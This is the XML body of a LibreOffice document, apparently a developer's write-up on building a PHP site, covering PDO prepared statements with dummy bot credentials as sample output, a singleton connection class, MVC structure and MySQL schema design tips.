      <text:p text:style-name="P93"><text:soft-page-break/><text:span text:style-name="T140"><text:s text:c="8"/></text:span><text:span text:style-name="T143">WHERE </text:span><text:span text:style-name="T136">`id`</text:span><text:span text:style-name="T143"> &gt; :idMin AND </text:span><text:span text:style-name="T136">`id`</text:span><text:span text:style-name="T143"> &lt; :idMax LIMIT 100"</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$statement</text:span><text:span text:style-name="T130">-&gt;</text:span><text:span text:style-name="T190">execute</text:span><text:span text:style-name="T130">([</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T143">"idMin" </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">5</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T143">"idMax" </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">10000</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">])</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$queryResults </text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T133">$statement</text:span><text:span text:style-name="T130">-&gt;</text:span><text:span text:style-name="T190">fetchAll</text:span><text:span text:style-name="T130">()</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">foreach </text:span><text:span text:style-name="T130">(</text:span><text:span text:style-name="T133">$queryResults </text:span><text:span text:style-name="T150">as </text:span><text:span text:style-name="T133">$row</text:span><text:span text:style-name="T130">) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">echo </text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T180">${</text:span><text:span text:style-name="T136">row</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"id"</text:span><text:span text:style-name="T180">]}</text:span><text:span text:style-name="T143">) </text:span><text:span text:style-name="T180">{</text:span><text:span text:style-name="T136">$row</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"name"</text:span><text:span text:style-name="T180">]}</text:span><text:span text:style-name="T143"> - </text:span><text:span text:style-name="T180">{</text:span><text:span text:style-name="T136">$row</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"password"</text:span><text:span text:style-name="T180">]}</text:span><text:span text:style-name="T143">&lt;br&gt;"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__4196_755149307"/></text:p>
      <text:p text:style-name="P62"><text:bookmark-start text:name="__DdeLink__4198_755149307"/>6) Bot101 - botpassword101<text:line-break/>7) Bot102 - botpassword102<text:line-break/>8) Bot103 - botpassword103<text:line-break/>9) Bot104 - botpassword104<text:line-break/>10) Bot105 - botpassword105<text:line-break/>11) Bot106 - botpassword106<text:line-break/>. . .<text:line-break/>96) Bot183 - botpassword183<text:line-break/>97) Bot184 - botpassword184<text:line-break/>98) Bot185 - botpassword185<text:line-break/>99) Bot186 - botpassword186<text:line-break/>100) Bot187 - botpassword187<text:line-break/>101) Bot188 - botpassword188<text:line-break/>102) Bot189 - botpassword189<text:line-break/>103) Bot19 - botpassword19<text:line-break/>104) Bot190 - botpassword190<text:line-break/>105) Bot191 — botpassword191<text:bookmark-end text:name="__DdeLink__4198_755149307"/></text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P57"><text:span text:style-name="T212"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4189_755149307"/><text:span text:style-name="T214">Lots of PHP developers do not care about all the subtle moments about connecting and querying. Just because they have their own class implementing all the</text:span><text:span text:style-name="T206"> work, starting with the connection finishing with queries which is just getting parameters from its owner who wrote it once like he wanted and tested it for years. </text:span><text:span text:style-name="T213">Such class is usually based on Singleton conception to keep one connection object and I have the simplest example of it.</text:span><text:bookmark-end text:name="__DdeLink__4189_755149307"/></text:p>
      <text:p text:style-name="P120"><text:bookmark-start text:name="__DdeLink__4200_755149307"/><text:span text:style-name="T152">class </text:span><text:span text:style-name="T216">myPDO</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private const </text:span><text:span text:style-name="T137">NO_CONNECTION </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T143">"Database is not available."</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static </text:span><text:span text:style-name="T137">$dsn </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T149">null</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static </text:span><text:span text:style-name="T137">$username </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T149">null</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static </text:span><text:span text:style-name="T137">$password </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T149">null</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static </text:span><text:span text:style-name="T137">$charset </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T149">null</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static </text:span><text:span text:style-name="T137">$connection</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">final private function </text:span><text:span text:style-name="T192">__construct</text:span><text:span text:style-name="T180">() { }</text:span></text:p>
      <text:p text:style-name="P93"><text:soft-page-break/><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">final private function </text:span><text:span text:style-name="T192">__clone</text:span><text:span text:style-name="T180">() { }</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">private static function </text:span><text:span text:style-name="T192">setParameters</text:span><text:span text:style-name="T180">(): void</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$parameters </text:span><text:span text:style-name="T180">= parse_ini_file(</text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T144">somepath</text:span><text:span text:style-name="T143">/.env"</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$charset </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T136">$parameters</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"charset"</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$dsn </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T136">$parameters</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"dsn"</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$dsn </text:span><text:span text:style-name="T180">.= </text:span><text:span text:style-name="T143">";charset=" </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$charset</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$username </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T136">$parameters</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"username"</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$password </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T136">$parameters</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"password"</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">public static function </text:span><text:span text:style-name="T192">getConnection</text:span><text:span text:style-name="T180">(): \PDO</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(is_null(</text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$connection</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T193">setParameters</text:span><text:span text:style-name="T180">()</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="12"/></text:span><text:span text:style-name="T149">try </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$connection </text:span><text:span text:style-name="T180">= </text:span><text:span text:style-name="T149">new </text:span><text:span text:style-name="T180">\PDO(</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="20"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$dsn</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="20"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$username</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="20"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$password</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T133"><text:s text:c="16"/></text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="12"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">catch </text:span><text:span text:style-name="T180">(\Exception </text:span><text:span text:style-name="T136">$exception</text:span><text:span text:style-name="T180">) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T180">error_log(</text:span><text:span text:style-name="T136">$exception</text:span><text:span text:style-name="T180">-&gt;</text:span><text:span text:style-name="T192">getMessage</text:span><text:span text:style-name="T180">())</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="16"/></text:span><text:span text:style-name="T149">die</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">NO_CONNECTION</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="12"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="8"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T149">return self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">$connection</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__4200_755149307"/></text:p>
      <text:p text:style-name="P65">6.MVC conception</text:p>
      <text:p text:style-name="P67"><text:span text:style-name="T217"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5230_1958350099"/><text:span text:style-name="T217">The majority (and maybe even all) of moder</text:span><text:span text:style-name="T231">n</text:span><text:span text:style-name="T217"> actual frameworks are working according MVC conception. The first (and may be the current?) version of this web-</text:span><text:span text:style-name="T231">site was whiten without any framework but I also did build the architecture according MVC principles. MVC is modern and simple technology which allows</text:span><text:span text:style-name="T218"> realy huge serious projects keep single and logi</text:span><text:span text:style-name="T231">c</text:span><text:span text:style-name="T218">al inner building style, keep being easy to be expanded and </text:span><text:span text:style-name="T219">being </text:span><text:span text:style-name="T218">easily realized by engineers who starts working under their structure and design when project </text:span><text:span text:style-name="T231">already</text:span><text:span text:style-name="T219"> has tons of code.</text:span><text:bookmark-end text:name="__DdeLink__5230_1958350099"/></text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T219"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5232_1958350099"/><text:span text:style-name="T220">Well MVC is a principle of separation of design and code: Model View Controller abbreviation. </text:span><text:span text:style-name="T221">What does it mean? It means that in simplest case, when user </text:span><text:span text:style-name="T231">click</text:span><text:span text:style-name="T221"> on link and gets to your «index.php» page the following scenarium runs:</text:span><text:bookmark-end text:name="__DdeLink__5232_1958350099"/></text:p>
      <text:list xml:id="list1069293676831494546" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P144"><text:bookmark-start text:name="__DdeLink__5243_1958350099"/>«IndexController.php» controller includes all the needed services and template engine (maybe autoloader is doing such thinks for it but it is needed to be noticed)<text:bookmark-end text:name="__DdeLink__5243_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P144"><text:bookmark-start text:name="__DdeLink__5245_1958350099"/>«Index.php» controller asks to its model «Model.php» to give him processed properly packaged data for the future displaying on page.<text:bookmark-end text:name="__DdeLink__5245_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P144"><text:bookmark-start text:name="__DdeLink__5247_1958350099"/><text:soft-page-break/>«Model.php» model gets data from database, process it if needed and gives back to «IndexController.php»<text:bookmark-end text:name="__DdeLink__5247_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P144"><text:bookmark-start text:name="__DdeLink__5249_1958350099"/><text:bookmark-start text:name="__DdeLink__5253_1958350099"/>«IndexController» file gives «IndexTemplate.tpl» template and received data to template engine.<text:bookmark-end text:name="__DdeLink__5249_1958350099"/><text:bookmark-end text:name="__DdeLink__5253_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P145"><text:bookmark-start text:name="__DdeLink__5251_1958350099"/><text:span text:style-name="T217">Template engine gets «IndexTemplate.tpl» template code, replaces variable</text:span><text:span text:style-name="T228">s</text:span><text:span text:style-name="T217"> in it by recieved data and displays modified template.</text:span><text:bookmark-end text:name="__DdeLink__5251_1958350099"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P68"><text:span text:style-name="T217"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5234_1958350099"/><text:span text:style-name="T223">So what are we getting? </text:span><text:bookmark-end text:name="__DdeLink__5234_1958350099"/></text:p>
      <text:list xml:id="list3422446710334011147" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P146"><text:bookmark-start text:name="__DdeLink__5255_1958350099"/><text:span text:style-name="T217">Desi</text:span><text:span text:style-name="T231">gn</text:span><text:span text:style-name="T217">ers do not need to understand the ones who build business logic. </text:span><text:span text:style-name="T228">The same is the other way around,.</text:span><text:span text:style-name="T217"> </text:span><text:span text:style-name="T229">Everything they need to agree on are</text:span><text:span text:style-name="T217"> variable keys on the templates.</text:span><text:bookmark-end text:name="__DdeLink__5255_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P147"><text:bookmark-start text:name="__DdeLink__5257_1958350099"/><text:span text:style-name="T217">Controller — the heart of the project — do not need </text:span><text:span text:style-name="T224">to be stained with </text:span><text:span text:style-name="T217">business</text:span><text:span text:style-name="T224"> logic: it all is stored in </text:span><text:span text:style-name="T225">model</text:span><text:span text:style-name="T224">.</text:span><text:bookmark-end text:name="__DdeLink__5257_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P148"><text:bookmark-start text:name="__DdeLink__5259_1958350099"/><text:span text:style-name="T224">M</text:span><text:span text:style-name="T217">odel is just a class or a set of separated functions which are all stored in one place and can be easily modified / removed / replaced.</text:span><text:bookmark-end text:name="__DdeLink__5259_1958350099"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P149"><text:bookmark-start text:name="__DdeLink__5261_1958350099"/><text:span text:style-name="T217">When the problem occures you knows </text:span><text:span text:style-name="T231">immediately</text:span><text:span text:style-name="T217"> which part of the trio is limping.</text:span><text:bookmark-end text:name="__DdeLink__5261_1958350099"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P69"><text:span text:style-name="T217"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5236_1958350099"/><text:span text:style-name="T222">That is the simplest and fundamental scenarium. In the real project scheme becomes more complicated. For example when building the project on Symfony 4 PHP framework model is divided into service which contains all logic and repository which </text:span><text:span text:style-name="T230">in its turn</text:span><text:span text:style-name="T222"> contains all flexible queries and just works with a database properly.</text:span><text:bookmark-end text:name="__DdeLink__5236_1958350099"/></text:p>
      <text:p text:style-name="P69"><text:span text:style-name="T222"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5238_1958350099"/><text:span text:style-name="T226">In general it is all about programming: the more you d</text:span><text:span text:style-name="T231">i</text:span><text:span text:style-name="T226">vide code into parts according their roles and </text:span><text:span text:style-name="T232">and</text:span><text:span text:style-name="T226"> you use separate parts of code again with new parameters the more your project is located to be expand and realized. </text:span><text:span text:style-name="T227">The most actual, reliable, easy to support and pleasant solutions are always simple :)</text:span><text:bookmark-end text:name="__DdeLink__5238_1958350099"/></text:p>
      <text:p text:style-name="P70"><text:span text:style-name="T227"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__5240_1958350099"/><text:span text:style-name="T233">Click here to see how the whole design of a page changes. </text:span><text:span text:style-name="T234">I can </text:span><text:span text:style-name="T218">expand </text:span><text:span text:style-name="T234">the page with a new styles without changing the template, controller, repository, even service </text:span><text:span text:style-name="T235">and any string of code at all</text:span><text:span text:style-name="T234">. I am just to put a new css file into needed directory and it will be injected into the project like a plugin.</text:span><text:bookmark-end text:name="__DdeLink__5240_1958350099"/></text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P71">7.Database design</text:p>
      <text:p text:style-name="P63"><text:tab/>Database design is obviously one of the most important aspects in web application design. It serves the fundament of the project. In case project team gives not enough time on planning the way each table of database is going to look like and <text:soft-page-break/>the way they are going to be connected <text:span text:style-name="T236">database with a course of time is going to be filled of duplicated data, data which cannot be reached normally, new functionallity will cause the creation of tones of codes for new logic and everything is going to be bad. In case of well thought out, logical and simple structure the database is going to help to follow the single style of project, be always actual, simple and easy to extend.</text:span></text:p>
      <text:p text:style-name="P89"><text:tab/><text:span text:style-name="T160">On this page I am going to show some aspects of </text:span><text:span text:style-name="T163">lightweight</text:span><text:span text:style-name="T161"> database design according to ruhighload.com web source and also to show the current web site database inner structure and to explain the main idea that I have chosen for the project design.</text:span></text:p>
      <text:list xml:id="list1919318051014102306" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P165"><text:span text:style-name="T161">D</text:span><text:span text:style-name="T160">o not try to foretell a far future creating a columns which are «not going to be used now but probably in a far future we are going to add a special feature...» No. With the extanding of project you </text:span><text:span text:style-name="T164">anyway</text:span><text:span text:style-name="T160"> will be forced to change the table structure. Wait untill this moment.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P166">Shorten the length of columns. No need not only to put names into TEXT type cells but to allocate VARCHAR(200) for names too.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P166">Try to avoid NULL values. To work with NULL MySQL is forced to use its special functions what is spending sources. Put NOT NULL identifier everywhere except dates.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P167">Select the minimum required numeric types. TINYINT will be always enought for human age, product types amount in bascket etc. Maybe for users from medium staff of the company SMALLINT will be enought for «id» field? You can always enlarge the type.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P168">FLOAT &amp; DOUBLE are much more appropriate for <text:span text:style-name="T237">performance</text:span> when talking of most of numeric data except banking sphere.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P169">Select CHAR for lines of approximately the same length. This way you save one-two bytes from each cell which do not contain lengt<text:span text:style-name="T237">h</text:span> of string.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P169">Otherwise chose VARCHAR. It is flexible althought it needs to contain lenght.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P169">Use ENUM instead of fixed-number rows (for example, a list of countries).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P169"><text:s/>Use TIMESTAMP to set the time of events (registration, sending messages, etc.). It is much more light than DATETIME.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P169">Otherwise chose DATETIME (for historical events etc)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P86"><text:soft-page-break/><text:tab/>Current project schema contains 8 entities: pages, titles, images, codes, lists, elements, links and of cour<text:span text:style-name="T237">s</text:span>e articles. In other words elements of contants of any web <text:span text:style-name="T238">page, literary source etc. Quite widespread situation. That is why I decided to store them separately, connect with each other and get them with a chain to each page. It</text:span> is logical, safe and it gives the administrator ability to edit and even to create (some way) pages.</text:p>
      <text:p text:style-name="P85"><text:span text:style-name="T160"><text:tab/></text:span><text:span text:style-name="T162">Contents need to be flexible: nobody knows would it be page without title or three pages containing the same article. So I desided to reject one-to-one and one-to-many relations. Many-to-many relation between page and title means that there can be page with lost of titles (and subtitles) and a title which takes a place in lots of pages. Sounds flexibly and logical. To avoid duplicating of huge articles and any data in such cases I have chosen one set of single principles: </text:span></text:p>
      <text:list xml:id="list1904155193477999945" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P170">no direct connection between any entities. If two entities are connected logically there is going to be a relation table.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P170">There are only relation tables for two entities: no empty cells in relation tables. For example there may very well be code without any describtion list and article. And it may also be the code with describtion lists set and articles set.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P171">No <text:span text:style-name="T238">duplicate</text:span> data except «id» fields. Relation tables contain only «id» fields.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P170">Each relation table contains only three fields: sel<text:span text:style-name="T238">f</text:span> «id», first entity «id» and second entity «id».</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P172">Most of entities contain only two fields: «id» and «name». <text:span text:style-name="T239">The exception is like a code having its output.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P88"><text:tab/>There is a schema. <text:s/><text:span text:style-name="T240">Images, codes, links and articles relatte to the page entity as title does.</text:span></text:p>
      <text:p text:style-name="P173">SELECT page.id, page.name, list.id, list.name</text:p>
      <text:p text:style-name="P173"><text:s text:c="4"/>FROM pages page</text:p>
      <text:p text:style-name="P173"><text:s text:c="4"/>JOIN list_page_relation list_page</text:p>
      <text:p text:style-name="P173"><text:s text:c="9"/>ON page.id = list_page.page_id AND page.name = 'DBDesign.php'</text:p>
      <text:p text:style-name="P173"><text:s text:c="4"/>JOIN lists list</text:p>
      <text:p text:style-name="P173"><text:s text:c="9"/>ON list.id = list_page.list_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Menlo" svg:font-family="Menlo, Monaco, 'Courier New', monospace"/>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4T13:26:49.422067847</meta:creation-date>
    <meta:generator>LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2</meta:generator>
    <dc:date>2018-04-26T14:59:55.970520597</dc:date>
    <meta:editing-duration>PT19H32M56S</meta:editing-duration>
    <meta:editing-cycles>162</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="19" meta:paragraph-count="481" meta:word-count="5546" meta:character-count="36266" meta:non-whitespace-character-count="29864"/>
  </office:meta>
</office:document-meta>
</file>